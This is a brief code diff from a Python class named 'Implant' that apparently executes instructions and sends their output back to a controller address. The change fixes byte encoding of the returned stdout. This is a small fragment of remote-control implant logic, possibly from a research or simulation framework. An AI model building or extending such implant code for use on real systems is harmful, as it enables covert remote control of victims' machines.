@@ -59,7 +59,7 @@ class Implant(Host):
                 raise SyntaxError
             elif "Timeout expired" in stderr:
                 raise TimeoutExpired
-            self.send(self.controller_ip, "instruction", stdout)
+            self.send(self.controller_ip, "instruction", stdout.encode())
             
         except TimeoutExpired:
             self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
